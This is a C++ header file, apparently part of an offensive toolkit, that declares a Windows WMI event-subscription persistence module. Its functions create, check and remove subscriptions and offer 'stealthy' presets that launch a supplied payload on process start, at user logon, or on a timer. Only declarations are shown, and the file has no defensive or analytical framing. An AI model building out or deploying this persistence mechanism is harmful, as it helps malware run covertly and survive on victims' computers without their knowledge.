#pragma once
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <string>

#pragma comment(lib, "wbemuuid.lib")

namespace l4g::persistence {

struct WMISubscriptionResult {
    bool success = false;
    std::string error;
};

class WMISubscription {
public:
    // Create persistent WMI event subscription
    static WMISubscriptionResult create(const std::wstring& filter_name, const std::wstring& consumer_name, 
                                        const std::wstring& query, const std::wstring& command);
    
    // Remove subscription
    static bool remove(const std::wstring& filter_name, const std::wstring& consumer_name);
    
    // Check if exists
    static bool exists(const std::wstring& filter_name);
    
    // Predefined stealthy subscriptions
    static WMISubscriptionResult create_process_monitor(const std::wstring& target_process, const std::wstring& payload);
    static WMISubscriptionResult create_logon_trigger(const std::wstring& payload);
    static WMISubscriptionResult create_timer_trigger(const std::wstring& payload, int interval_seconds);
    
private:
    static HRESULT connect_wmi(IWbemServices** ppSvc);
};

} // namespace l4g::persistence